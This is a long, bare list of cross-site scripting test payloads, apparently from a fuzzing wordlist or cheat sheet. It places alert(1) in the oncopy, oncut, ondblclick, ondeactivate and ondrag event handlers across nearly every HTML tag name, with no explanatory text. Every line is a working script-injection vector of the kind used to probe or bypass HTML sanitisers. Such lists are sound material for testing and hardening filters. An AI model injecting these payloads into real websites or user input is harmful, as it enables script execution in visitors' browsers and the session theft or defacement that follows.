<title oncopy="alert(1)" contenteditable>test</title>
<tr oncopy="alert(1)" contenteditable>test</tr>
<track oncopy="alert(1)" contenteditable>test</track>
<tt oncopy="alert(1)" contenteditable>test</tt>
<u oncopy="alert(1)" contenteditable>test</u>
<ul oncopy="alert(1)" contenteditable>test</ul>
<var oncopy="alert(1)" contenteditable>test</var>
<video oncopy="alert(1)" contenteditable>test</video>
<wbr oncopy="alert(1)" contenteditable>test</wbr>
<xmp oncopy="alert(1)" contenteditable>test</xmp>
<input oncut=alert(1) value="XSS" autofocus>
<textarea oncut=alert(1) autofocus>XSS</textarea>
<a oncut="alert(1)" contenteditable>test</a>
<abbr oncut="alert(1)" contenteditable>test</abbr>
<acronym oncut="alert(1)" contenteditable>test</acronym>
<address oncut="alert(1)" contenteditable>test</address>
<applet oncut="alert(1)" contenteditable>test</applet>
<area oncut="alert(1)" contenteditable>test</area>
<article oncut="alert(1)" contenteditable>test</article>
<aside oncut="alert(1)" contenteditable>test</aside>
<audio oncut="alert(1)" contenteditable>test</audio>
<b oncut="alert(1)" contenteditable>test</b>
<base oncut="alert(1)" contenteditable>test</base>
<basefont oncut="alert(1)" contenteditable>test</basefont>
<bdi oncut="alert(1)" contenteditable>test</bdi>
<bdo oncut="alert(1)" contenteditable>test</bdo>
<bgsound oncut="alert(1)" contenteditable>test</bgsound>
<big oncut="alert(1)" contenteditable>test</big>
<blink oncut="alert(1)" contenteditable>test</blink>
<blockquote oncut="alert(1)" contenteditable>test</blockquote>
<body oncut="alert(1)" contenteditable>test</body>
<br oncut="alert(1)" contenteditable>test</br>
<button oncut="alert(1)" contenteditable>test</button>
<canvas oncut="alert(1)" contenteditable>test</canvas>
<caption oncut="alert(1)" contenteditable>test</caption>
<center oncut="alert(1)" contenteditable>test</center>
<cite oncut="alert(1)" contenteditable>test</cite>
<code oncut="alert(1)" contenteditable>test</code>
<col oncut="alert(1)" contenteditable>test</col>
<colgroup oncut="alert(1)" contenteditable>test</colgroup>
<command oncut="alert(1)" contenteditable>test</command>
<content oncut="alert(1)" contenteditable>test</content>
<data oncut="alert(1)" contenteditable>test</data>
<datalist oncut="alert(1)" contenteditable>test</datalist>
<dd oncut="alert(1)" contenteditable>test</dd>
<del oncut="alert(1)" contenteditable>test</del>
<details oncut="alert(1)" contenteditable>test</details>
<dfn oncut="alert(1)" contenteditable>test</dfn>
<dialog oncut="alert(1)" contenteditable>test</dialog>
<dir oncut="alert(1)" contenteditable>test</dir>
<div oncut="alert(1)" contenteditable>test</div>
<dl oncut="alert(1)" contenteditable>test</dl>
<dt oncut="alert(1)" contenteditable>test</dt>
<element oncut="alert(1)" contenteditable>test</element>
<em oncut="alert(1)" contenteditable>test</em>
<embed oncut="alert(1)" contenteditable>test</embed>
<fieldset oncut="alert(1)" contenteditable>test</fieldset>
<figcaption oncut="alert(1)" contenteditable>test</figcaption>
<figure oncut="alert(1)" contenteditable>test</figure>
<font oncut="alert(1)" contenteditable>test</font>
<footer oncut="alert(1)" contenteditable>test</footer>
<form oncut="alert(1)" contenteditable>test</form>
<frame oncut="alert(1)" contenteditable>test</frame>
<frameset oncut="alert(1)" contenteditable>test</frameset>
<h1 oncut="alert(1)" contenteditable>test</h1>
<head oncut="alert(1)" contenteditable>test</head>
<header oncut="alert(1)" contenteditable>test</header>
<hgroup oncut="alert(1)" contenteditable>test</hgroup>
<hr oncut="alert(1)" contenteditable>test</hr>
<html oncut="alert(1)" contenteditable>test</html>
<i oncut="alert(1)" contenteditable>test</i>
<iframe oncut="alert(1)" contenteditable>test</iframe>
<image oncut="alert(1)" contenteditable>test</image>
<img oncut="alert(1)" contenteditable>test</img>
<ins oncut="alert(1)" contenteditable>test</ins>
<isindex oncut="alert(1)" contenteditable>test</isindex>
<kbd oncut="alert(1)" contenteditable>test</kbd>
<keygen oncut="alert(1)" contenteditable>test</keygen>
<label oncut="alert(1)" contenteditable>test</label>
<legend oncut="alert(1)" contenteditable>test</legend>
<li oncut="alert(1)" contenteditable>test</li>
<link oncut="alert(1)" contenteditable>test</link>
<listing oncut="alert(1)" contenteditable>test</listing>
<main oncut="alert(1)" contenteditable>test</main>
<map oncut="alert(1)" contenteditable>test</map>
<mark oncut="alert(1)" contenteditable>test</mark>
<marquee oncut="alert(1)" contenteditable>test</marquee>
<menu oncut="alert(1)" contenteditable>test</menu>
<menuitem oncut="alert(1)" contenteditable>test</menuitem>
<meta oncut="alert(1)" contenteditable>test</meta>
<meter oncut="alert(1)" contenteditable>test</meter>
<multicol oncut="alert(1)" contenteditable>test</multicol>
<nav oncut="alert(1)" contenteditable>test</nav>
<nextid oncut="alert(1)" contenteditable>test</nextid>
<nobr oncut="alert(1)" contenteditable>test</nobr>
<noembed oncut="alert(1)" contenteditable>test</noembed>
<noframes oncut="alert(1)" contenteditable>test</noframes>
<noscript oncut="alert(1)" contenteditable>test</noscript>
<object oncut="alert(1)" contenteditable>test</object>
<ol oncut="alert(1)" contenteditable>test</ol>
<optgroup oncut="alert(1)" contenteditable>test</optgroup>
<option oncut="alert(1)" contenteditable>test</option>
<output oncut="alert(1)" contenteditable>test</output>
<p oncut="alert(1)" contenteditable>test</p>
<param oncut="alert(1)" contenteditable>test</param>
<picture oncut="alert(1)" contenteditable>test</picture>
<plaintext oncut="alert(1)" contenteditable>test</plaintext>
<pre oncut="alert(1)" contenteditable>test</pre>
<progress oncut="alert(1)" contenteditable>test</progress>
<q oncut="alert(1)" contenteditable>test</q>
<rb oncut="alert(1)" contenteditable>test</rb>
<rp oncut="alert(1)" contenteditable>test</rp>
<rt oncut="alert(1)" contenteditable>test</rt>
<rtc oncut="alert(1)" contenteditable>test</rtc>
<ruby oncut="alert(1)" contenteditable>test</ruby>
<s oncut="alert(1)" contenteditable>test</s>
<samp oncut="alert(1)" contenteditable>test</samp>
<script oncut="alert(1)" contenteditable>test</script>
<section oncut="alert(1)" contenteditable>test</section>
<select oncut="alert(1)" contenteditable>test</select>
<shadow oncut="alert(1)" contenteditable>test</shadow>
<slot oncut="alert(1)" contenteditable>test</slot>
<small oncut="alert(1)" contenteditable>test</small>
<source oncut="alert(1)" contenteditable>test</source>
<spacer oncut="alert(1)" contenteditable>test</spacer>
<span oncut="alert(1)" contenteditable>test</span>
<strike oncut="alert(1)" contenteditable>test</strike>
<strong oncut="alert(1)" contenteditable>test</strong>
<style oncut="alert(1)" contenteditable>test</style>
<sub oncut="alert(1)" contenteditable>test</sub>
<summary oncut="alert(1)" contenteditable>test</summary>
<sup oncut="alert(1)" contenteditable>test</sup>
<svg oncut="alert(1)" contenteditable>test</svg>
<table oncut="alert(1)" contenteditable>test</table>
<tbody oncut="alert(1)" contenteditable>test</tbody>
<td oncut="alert(1)" contenteditable>test</td>
<template oncut="alert(1)" contenteditable>test</template>
<tfoot oncut="alert(1)" contenteditable>test</tfoot>
<th oncut="alert(1)" contenteditable>test</th>
<thead oncut="alert(1)" contenteditable>test</thead>
<time oncut="alert(1)" contenteditable>test</time>
<title oncut="alert(1)" contenteditable>test</title>
<tr oncut="alert(1)" contenteditable>test</tr>
<track oncut="alert(1)" contenteditable>test</track>
<tt oncut="alert(1)" contenteditable>test</tt>
<u oncut="alert(1)" contenteditable>test</u>
<ul oncut="alert(1)" contenteditable>test</ul>
<var oncut="alert(1)" contenteditable>test</var>
<video oncut="alert(1)" contenteditable>test</video>
<wbr oncut="alert(1)" contenteditable>test</wbr>
<xmp oncut="alert(1)" contenteditable>test</xmp>
<a ondblclick="alert(1)">test</a>
<abbr ondblclick="alert(1)">test</abbr>
<acronym ondblclick="alert(1)">test</acronym>
<address ondblclick="alert(1)">test</address>
<applet ondblclick="alert(1)">test</applet>
<area ondblclick="alert(1)">test</area>
<article ondblclick="alert(1)">test</article>
<aside ondblclick="alert(1)">test</aside>
<audio ondblclick="alert(1)">test</audio>
<b ondblclick="alert(1)">test</b>
<base ondblclick="alert(1)">test</base>
<basefont ondblclick="alert(1)">test</basefont>
<bdi ondblclick="alert(1)">test</bdi>
<bdo ondblclick="alert(1)">test</bdo>
<bgsound ondblclick="alert(1)">test</bgsound>
<big ondblclick="alert(1)">test</big>
<blink ondblclick="alert(1)">test</blink>
<blockquote ondblclick="alert(1)">test</blockquote>
<body ondblclick="alert(1)">test</body>
<br ondblclick="alert(1)">test</br>
<button ondblclick="alert(1)">test</button>
<canvas ondblclick="alert(1)">test</canvas>
<caption ondblclick="alert(1)">test</caption>
<center ondblclick="alert(1)">test</center>
<cite ondblclick="alert(1)">test</cite>
<code ondblclick="alert(1)">test</code>
<col ondblclick="alert(1)">test</col>
<colgroup ondblclick="alert(1)">test</colgroup>
<command ondblclick="alert(1)">test</command>
<content ondblclick="alert(1)">test</content>
<data ondblclick="alert(1)">test</data>
<datalist ondblclick="alert(1)">test</datalist>
<dd ondblclick="alert(1)">test</dd>
<del ondblclick="alert(1)">test</del>
<details ondblclick="alert(1)">test</details>
<dfn ondblclick="alert(1)">test</dfn>
<dialog ondblclick="alert(1)">test</dialog>
<dir ondblclick="alert(1)">test</dir>
<div ondblclick="alert(1)">test</div>
<dl ondblclick="alert(1)">test</dl>
<dt ondblclick="alert(1)">test</dt>
<element ondblclick="alert(1)">test</element>
<em ondblclick="alert(1)">test</em>
<embed ondblclick="alert(1)">test</embed>
<fieldset ondblclick="alert(1)">test</fieldset>
<figcaption ondblclick="alert(1)">test</figcaption>
<figure ondblclick="alert(1)">test</figure>
<font ondblclick="alert(1)">test</font>
<footer ondblclick="alert(1)">test</footer>
<form ondblclick="alert(1)">test</form>
<frame ondblclick="alert(1)">test</frame>
<frameset ondblclick="alert(1)">test</frameset>
<h1 ondblclick="alert(1)">test</h1>
<head ondblclick="alert(1)">test</head>
<header ondblclick="alert(1)">test</header>
<hgroup ondblclick="alert(1)">test</hgroup>
<hr ondblclick="alert(1)">test</hr>
<html ondblclick="alert(1)">test</html>
<i ondblclick="alert(1)">test</i>
<iframe ondblclick="alert(1)">test</iframe>
<image ondblclick="alert(1)">test</image>
<img ondblclick="alert(1)">test</img>
<input ondblclick="alert(1)">test</input>
<ins ondblclick="alert(1)">test</ins>
<isindex ondblclick="alert(1)">test</isindex>
<kbd ondblclick="alert(1)">test</kbd>
<keygen ondblclick="alert(1)">test</keygen>
<label ondblclick="alert(1)">test</label>
<legend ondblclick="alert(1)">test</legend>
<li ondblclick="alert(1)">test</li>
<link ondblclick="alert(1)">test</link>
<listing ondblclick="alert(1)">test</listing>
<main ondblclick="alert(1)">test</main>
<map ondblclick="alert(1)">test</map>
<mark ondblclick="alert(1)">test</mark>
<marquee ondblclick="alert(1)">test</marquee>
<menu ondblclick="alert(1)">test</menu>
<menuitem ondblclick="alert(1)">test</menuitem>
<meta ondblclick="alert(1)">test</meta>
<meter ondblclick="alert(1)">test</meter>
<multicol ondblclick="alert(1)">test</multicol>
<nav ondblclick="alert(1)">test</nav>
<nextid ondblclick="alert(1)">test</nextid>
<nobr ondblclick="alert(1)">test</nobr>
<noembed ondblclick="alert(1)">test</noembed>
<noframes ondblclick="alert(1)">test</noframes>
<noscript ondblclick="alert(1)">test</noscript>
<object ondblclick="alert(1)">test</object>
<ol ondblclick="alert(1)">test</ol>
<optgroup ondblclick="alert(1)">test</optgroup>
<option ondblclick="alert(1)">test</option>
<output ondblclick="alert(1)">test</output>
<p ondblclick="alert(1)">test</p>
<param ondblclick="alert(1)">test</param>
<picture ondblclick="alert(1)">test</picture>
<plaintext ondblclick="alert(1)">test</plaintext>
<pre ondblclick="alert(1)">test</pre>
<progress ondblclick="alert(1)">test</progress>
<q ondblclick="alert(1)">test</q>
<rb ondblclick="alert(1)">test</rb>
<rp ondblclick="alert(1)">test</rp>
<rt ondblclick="alert(1)">test</rt>
<rtc ondblclick="alert(1)">test</rtc>
<ruby ondblclick="alert(1)">test</ruby>
<s ondblclick="alert(1)">test</s>
<samp ondblclick="alert(1)">test</samp>
<script ondblclick="alert(1)">test</script>
<section ondblclick="alert(1)">test</section>
<select ondblclick="alert(1)">test</select>
<shadow ondblclick="alert(1)">test</shadow>
<slot ondblclick="alert(1)">test</slot>
<small ondblclick="alert(1)">test</small>
<source ondblclick="alert(1)">test</source>
<spacer ondblclick="alert(1)">test</spacer>
<span ondblclick="alert(1)">test</span>
<strike ondblclick="alert(1)">test</strike>
<strong ondblclick="alert(1)">test</strong>
<style ondblclick="alert(1)">test</style>
<sub ondblclick="alert(1)">test</sub>
<summary ondblclick="alert(1)">test</summary>
<sup ondblclick="alert(1)">test</sup>
<svg ondblclick="alert(1)">test</svg>
<table ondblclick="alert(1)">test</table>
<tbody ondblclick="alert(1)">test</tbody>
<td ondblclick="alert(1)">test</td>
<template ondblclick="alert(1)">test</template>
<textarea ondblclick="alert(1)">test</textarea>
<tfoot ondblclick="alert(1)">test</tfoot>
<th ondblclick="alert(1)">test</th>
<thead ondblclick="alert(1)">test</thead>
<time ondblclick="alert(1)">test</time>
<title ondblclick="alert(1)">test</title>
<tr ondblclick="alert(1)">test</tr>
<track ondblclick="alert(1)">test</track>
<tt ondblclick="alert(1)">test</tt>
<u ondblclick="alert(1)">test</u>
<ul ondblclick="alert(1)">test</ul>
<var ondblclick="alert(1)">test</var>
<video ondblclick="alert(1)">test</video>
<wbr ondblclick="alert(1)">test</wbr>
<xmp ondblclick="alert(1)">test</xmp>
<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>
<abbr id=x tabindex=1 ondeactivate=alert(1)></abbr><input id=y autofocus>
<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>
<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>
<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>
<area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>
<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>
<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>
<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>
<b id=x tabindex=1 ondeactivate=alert(1)></b><input id=y autofocus>
<base id=x tabindex=1 ondeactivate=alert(1)></base><input id=y autofocus>
<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>
<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>
<bdo id=x tabindex=1 ondeactivate=alert(1)></bdo><input id=y autofocus>
<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>
<big id=x tabindex=1 ondeactivate=alert(1)></big><input id=y autofocus>
<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>
<blockquote id=x tabindex=1 ondeactivate=alert(1)></blockquote><input id=y autofocus>
<body id=x tabindex=1 ondeactivate=alert(1)></body><input id=y autofocus>
<br id=x tabindex=1 ondeactivate=alert(1)></br><input id=y autofocus>
<button id=x tabindex=1 ondeactivate=alert(1)></button><input id=y autofocus>
<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>
<caption id=x tabindex=1 ondeactivate=alert(1)></caption><input id=y autofocus>
<center id=x tabindex=1 ondeactivate=alert(1)></center><input id=y autofocus>
<cite id=x tabindex=1 ondeactivate=alert(1)></cite><input id=y autofocus>
<code id=x tabindex=1 ondeactivate=alert(1)></code><input id=y autofocus>
<col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>
<colgroup id=x tabindex=1 ondeactivate=alert(1)></colgroup><input id=y autofocus>
<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>
<content id=x tabindex=1 ondeactivate=alert(1)></content><input id=y autofocus>
<data id=x tabindex=1 ondeactivate=alert(1)></data><input id=y autofocus>
<datalist id=x tabindex=1 ondeactivate=alert(1)></datalist><input id=y autofocus>
<dd id=x tabindex=1 ondeactivate=alert(1)></dd><input id=y autofocus>
<del id=x tabindex=1 ondeactivate=alert(1)></del><input id=y autofocus>
<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>
<dfn id=x tabindex=1 ondeactivate=alert(1)></dfn><input id=y autofocus>
<dialog id=x tabindex=1 ondeactivate=alert(1)></dialog><input id=y autofocus>
<dir id=x tabindex=1 ondeactivate=alert(1)></dir><input id=y autofocus>
<div id=x tabindex=1 ondeactivate=alert(1)></div><input id=y autofocus>
<dl id=x tabindex=1 ondeactivate=alert(1)></dl><input id=y autofocus>
<dt id=x tabindex=1 ondeactivate=alert(1)></dt><input id=y autofocus>
<element id=x tabindex=1 ondeactivate=alert(1)></element><input id=y autofocus>
<em id=x tabindex=1 ondeactivate=alert(1)></em><input id=y autofocus>
<embed id=x tabindex=1 ondeactivate=alert(1)></embed><input id=y autofocus>
<fieldset id=x tabindex=1 ondeactivate=alert(1)></fieldset><input id=y autofocus>
<figcaption id=x tabindex=1 ondeactivate=alert(1)></figcaption><input id=y autofocus>
<figure id=x tabindex=1 ondeactivate=alert(1)></figure><input id=y autofocus>
<font id=x tabindex=1 ondeactivate=alert(1)></font><input id=y autofocus>
<footer id=x tabindex=1 ondeactivate=alert(1)></footer><input id=y autofocus>
<form id=x tabindex=1 ondeactivate=alert(1)></form><input id=y autofocus>
<frame id=x tabindex=1 ondeactivate=alert(1)></frame><input id=y autofocus>
<frameset id=x tabindex=1 ondeactivate=alert(1)></frameset><input id=y autofocus>
<h1 id=x tabindex=1 ondeactivate=alert(1)></h1><input id=y autofocus>
<head id=x tabindex=1 ondeactivate=alert(1)></head><input id=y autofocus>
<header id=x tabindex=1 ondeactivate=alert(1)></header><input id=y autofocus>
<hgroup id=x tabindex=1 ondeactivate=alert(1)></hgroup><input id=y autofocus>
<hr id=x tabindex=1 ondeactivate=alert(1)></hr><input id=y autofocus>
<html id=x tabindex=1 ondeactivate=alert(1)></html><input id=y autofocus>
<i id=x tabindex=1 ondeactivate=alert(1)></i><input id=y autofocus>
<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>
<image id=x tabindex=1 ondeactivate=alert(1)></image><input id=y autofocus>
<img id=x tabindex=1 ondeactivate=alert(1)></img><input id=y autofocus>
<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus>
<ins id=x tabindex=1 ondeactivate=alert(1)></ins><input id=y autofocus>
<isindex id=x tabindex=1 ondeactivate=alert(1)></isindex><input id=y autofocus>
<kbd id=x tabindex=1 ondeactivate=alert(1)></kbd><input id=y autofocus>
<keygen id=x tabindex=1 ondeactivate=alert(1)></keygen><input id=y autofocus>
<label id=x tabindex=1 ondeactivate=alert(1)></label><input id=y autofocus>
<legend id=x tabindex=1 ondeactivate=alert(1)></legend><input id=y autofocus>
<li id=x tabindex=1 ondeactivate=alert(1)></li><input id=y autofocus>
<link id=x tabindex=1 ondeactivate=alert(1)></link><input id=y autofocus>
<listing id=x tabindex=1 ondeactivate=alert(1)></listing><input id=y autofocus>
<main id=x tabindex=1 ondeactivate=alert(1)></main><input id=y autofocus>
<map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>
<mark id=x tabindex=1 ondeactivate=alert(1)></mark><input id=y autofocus>
<marquee id=x tabindex=1 ondeactivate=alert(1)></marquee><input id=y autofocus>
<menu id=x tabindex=1 ondeactivate=alert(1)></menu><input id=y autofocus>
<menuitem id=x tabindex=1 ondeactivate=alert(1)></menuitem><input id=y autofocus>
<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>
<meter id=x tabindex=1 ondeactivate=alert(1)></meter><input id=y autofocus>
<multicol id=x tabindex=1 ondeactivate=alert(1)></multicol><input id=y autofocus>
<nav id=x tabindex=1 ondeactivate=alert(1)></nav><input id=y autofocus>
<nextid id=x tabindex=1 ondeactivate=alert(1)></nextid><input id=y autofocus>
<nobr id=x tabindex=1 ondeactivate=alert(1)></nobr><input id=y autofocus>
<noembed id=x tabindex=1 ondeactivate=alert(1)></noembed><input id=y autofocus>
<noframes id=x tabindex=1 ondeactivate=alert(1)></noframes><input id=y autofocus>
<noscript id=x tabindex=1 ondeactivate=alert(1)></noscript><input id=y autofocus>
<object id=x tabindex=1 ondeactivate=alert(1)></object><input id=y autofocus>
<ol id=x tabindex=1 ondeactivate=alert(1)></ol><input id=y autofocus>
<optgroup id=x tabindex=1 ondeactivate=alert(1)></optgroup><input id=y autofocus>
<option id=x tabindex=1 ondeactivate=alert(1)></option><input id=y autofocus>
<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>
<p id=x tabindex=1 ondeactivate=alert(1)></p><input id=y autofocus>
<param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>
<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>
<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>
<pre id=x tabindex=1 ondeactivate=alert(1)></pre><input id=y autofocus>
<progress id=x tabindex=1 ondeactivate=alert(1)></progress><input id=y autofocus>
<q id=x tabindex=1 ondeactivate=alert(1)></q><input id=y autofocus>
<rb id=x tabindex=1 ondeactivate=alert(1)></rb><input id=y autofocus>
<rp id=x tabindex=1 ondeactivate=alert(1)></rp><input id=y autofocus>
<rt id=x tabindex=1 ondeactivate=alert(1)></rt><input id=y autofocus>
<rtc id=x tabindex=1 ondeactivate=alert(1)></rtc><input id=y autofocus>
<ruby id=x tabindex=1 ondeactivate=alert(1)></ruby><input id=y autofocus>
<s id=x tabindex=1 ondeactivate=alert(1)></s><input id=y autofocus>
<samp id=x tabindex=1 ondeactivate=alert(1)></samp><input id=y autofocus>
<script id=x tabindex=1 ondeactivate=alert(1)></script><input id=y autofocus>
<section id=x tabindex=1 ondeactivate=alert(1)></section><input id=y autofocus>
<select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>
<shadow id=x tabindex=1 ondeactivate=alert(1)></shadow><input id=y autofocus>
<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>
<small id=x tabindex=1 ondeactivate=alert(1)></small><input id=y autofocus>
<source id=x tabindex=1 ondeactivate=alert(1)></source><input id=y autofocus>
<spacer id=x tabindex=1 ondeactivate=alert(1)></spacer><input id=y autofocus>
<span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>
<strike id=x tabindex=1 ondeactivate=alert(1)></strike><input id=y autofocus>
<strong id=x tabindex=1 ondeactivate=alert(1)></strong><input id=y autofocus>
<style id=x tabindex=1 ondeactivate=alert(1)></style><input id=y autofocus>
<sub id=x tabindex=1 ondeactivate=alert(1)></sub><input id=y autofocus>
<summary id=x tabindex=1 ondeactivate=alert(1)></summary><input id=y autofocus>
<sup id=x tabindex=1 ondeactivate=alert(1)></sup><input id=y autofocus>
<svg id=x tabindex=1 ondeactivate=alert(1)></svg><input id=y autofocus>
<table id=x tabindex=1 ondeactivate=alert(1)></table><input id=y autofocus>
<tbody id=x tabindex=1 ondeactivate=alert(1)></tbody><input id=y autofocus>
<td id=x tabindex=1 ondeactivate=alert(1)></td><input id=y autofocus>
<template id=x tabindex=1 ondeactivate=alert(1)></template><input id=y autofocus>
<textarea id=x tabindex=1 ondeactivate=alert(1)></textarea><input id=y autofocus>
<tfoot id=x tabindex=1 ondeactivate=alert(1)></tfoot><input id=y autofocus>
<th id=x tabindex=1 ondeactivate=alert(1)></th><input id=y autofocus>
<thead id=x tabindex=1 ondeactivate=alert(1)></thead><input id=y autofocus>
<time id=x tabindex=1 ondeactivate=alert(1)></time><input id=y autofocus>
<title id=x tabindex=1 ondeactivate=alert(1)></title><input id=y autofocus>
<tr id=x tabindex=1 ondeactivate=alert(1)></tr><input id=y autofocus>
<track id=x tabindex=1 ondeactivate=alert(1)></track><input id=y autofocus>
<tt id=x tabindex=1 ondeactivate=alert(1)></tt><input id=y autofocus>
<u id=x tabindex=1 ondeactivate=alert(1)></u><input id=y autofocus>
<ul id=x tabindex=1 ondeactivate=alert(1)></ul><input id=y autofocus>
<var id=x tabindex=1 ondeactivate=alert(1)></var><input id=y autofocus>
<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>
<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>
<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>
<xss id=x tabindex=1 ondeactivate=alert(1)></xss><input autofocus>
<a draggable="true" ondrag="alert(1)">test</a>
<abbr draggable="true" ondrag="alert(1)">test</abbr>
<acronym draggable="true" ondrag="alert(1)">test</acronym>
<address draggable="true" ondrag="alert(1)">test</address>
<applet draggable="true" ondrag="alert(1)">test</applet>
<area draggable="true" ondrag="alert(1)">test</area>
<article draggable="true" ondrag="alert(1)">test</article>
<aside draggable="true" ondrag="alert(1)">test</aside>
<audio draggable="true" ondrag="alert(1)">test</audio>
<b draggable="true" ondrag="alert(1)">test</b>
<base draggable="true" ondrag="alert(1)">test</base>
<basefont draggable="true" ondrag="alert(1)">test</basefont>
<bdi draggable="true" ondrag="alert(1)">test</bdi>
<bdo draggable="true" ondrag="alert(1)">test</bdo>
<bgsound draggable="true" ondrag="alert(1)">test</bgsound>
<big draggable="true" ondrag="alert(1)">test</big>
<blink draggable="true" ondrag="alert(1)">test</blink>
<blockquote draggable="true" ondrag="alert(1)">test</blockquote>
<body draggable="true" ondrag="alert(1)">test</body>
<br draggable="true" ondrag="alert(1)">test</br>
<button draggable="true" ondrag="alert(1)">test</button>
<canvas draggable="true" ondrag="alert(1)">test</canvas>
<caption draggable="true" ondrag="alert(1)">test</caption>
<center draggable="true" ondrag="alert(1)">test</center>
<cite draggable="true" ondrag="alert(1)">test</cite>
<code draggable="true" ondrag="alert(1)">test</code>
<col draggable="true" ondrag="alert(1)">test</col>
<colgroup draggable="true" ondrag="alert(1)">test</colgroup>
<command draggable="true" ondrag="alert(1)">test</command>
<content draggable="true" ondrag="alert(1)">test</content>
<data draggable="true" ondrag="alert(1)">test</data>
<datalist draggable="true" ondrag="alert(1)">test</datalist>
<dd draggable="true" ondrag="alert(1)">test</dd>
<del draggable="true" ondrag="alert(1)">test</del>
<details draggable="true" ondrag="alert(1)">test</details>
<dfn draggable="true" ondrag="alert(1)">test</dfn>
<dialog draggable="true" ondrag="alert(1)">test</dialog>
<dir draggable="true" ondrag="alert(1)">test</dir>
<div draggable="true" ondrag="alert(1)">test</div>
<dl draggable="true" ondrag="alert(1)">test</dl>
<dt draggable="true" ondrag="alert(1)">test</dt>
<element draggable="true" ondrag="alert(1)">test</element>
<em draggable="true" ondrag="alert(1)">test</em>
<embed draggable="true" ondrag="alert(1)">test</embed>
<fieldset draggable="true" ondrag="alert(1)">test</fieldset>
<figcaption draggable="true" ondrag="alert(1)">test</figcaption>
<figure draggable="true" ondrag="alert(1)">test</figure>
<font draggable="true" ondrag="alert(1)">test</font>
<footer draggable="true" ondrag="alert(1)">test</footer>
<form draggable="true" ondrag="alert(1)">test</form>
<frame draggable="true" ondrag="alert(1)">test</frame>
<frameset draggable="true" ondrag="alert(1)">test</frameset>
<h1 draggable="true" ondrag="alert(1)">test</h1>
<head draggable="true" ondrag="alert(1)">test</head>
<header draggable="true" ondrag="alert(1)">test</header>
<hgroup draggable="true" ondrag="alert(1)">test</hgroup>
<hr draggable="true" ondrag="alert(1)">test</hr>
<html draggable="true" ondrag="alert(1)">test</html>
<i draggable="true" ondrag="alert(1)">test</i>
<iframe draggable="true" ondrag="alert(1)">test</iframe>
<image draggable="true" ondrag="alert(1)">test</image>
<img draggable="true" ondrag="alert(1)">test</img>
<input draggable="true" ondrag="alert(1)">test</input>
<ins draggable="true" ondrag="alert(1)">test</ins>
<isindex draggable="true" ondrag="alert(1)">test</isindex>
<kbd draggable="true" ondrag="alert(1)">test</kbd>
<keygen draggable="true" ondrag="alert(1)">test</keygen>
<label draggable="true" ondrag="alert(1)">test</label>
<legend draggable="true" ondrag="alert(1)">test</legend>
<li draggable="true" ondrag="alert(1)">test</li>
<link draggable="true" ondrag="alert(1)">test</link>
<listing draggable="true" ondrag="alert(1)">test</listing>
<main draggable="true" ondrag="alert(1)">test</main>
<map draggable="true" ondrag="alert(1)">test</map>
<mark draggable="true" ondrag="alert(1)">test</mark>
<marquee draggable="true" ondrag="alert(1)">test</marquee>
<menu draggable="true" ondrag="alert(1)">test</menu>
<menuitem draggable="true" ondrag="alert(1)">test</menuitem>
<meta draggable="true" ondrag="alert(1)">test</meta>
<meter draggable="true" ondrag="alert(1)">test</meter>
<multicol draggable="true" ondrag="alert(1)">test</multicol>
<nav draggable="true" ondrag="alert(1)">test</nav>
<nextid draggable="true" ondrag="alert(1)">test</nextid>
<nobr draggable="true" ondrag="alert(1)">test</nobr>
<noembed draggable="true" ondrag="alert(1)">test</noembed>
<noframes draggable="true" ondrag="alert(1)">test</noframes>
<noscript draggable="true" ondrag="alert(1)">test</noscript>
<object draggable="true" ondrag="alert(1)">test</object>
<ol draggable="true" ondrag="alert(1)">test</ol>
<optgroup draggable="true" ondrag="alert(1)">test</optgroup>
<option draggable="true" ondrag="alert(1)">test</option>
<output draggable="true" ondrag="alert(1)">test</output>
<p draggable="true" ondrag="alert(1)">test</p>
<param draggable="true" ondrag="alert(1)">test</param>
<picture draggable="true" ondrag="alert(1)">test</picture>
<plaintext draggable="true" ondrag="alert(1)">test</plaintext>
<pre draggable="true" ondrag="alert(1)">test</pre>
<progress draggable="true" ondrag="alert(1)">test</progress>
<q draggable="true" ondrag="alert(1)">test</q>
<rb draggable="true" ondrag="alert(1)">test</rb>
<rp draggable="true" ondrag="alert(1)">test</rp>
<rt draggable="true" ondrag="alert(1)">test</rt>
<rtc draggable="true" ondrag="alert(1)">test</rtc>
<ruby draggable="true" ondrag="alert(1)">test</ruby>
<s draggable="true" ondrag="alert(1)">test</s>
<samp draggable="true" ondrag="alert(1)">test</samp>
<script draggable="true" ondrag="alert(1)">test</script>
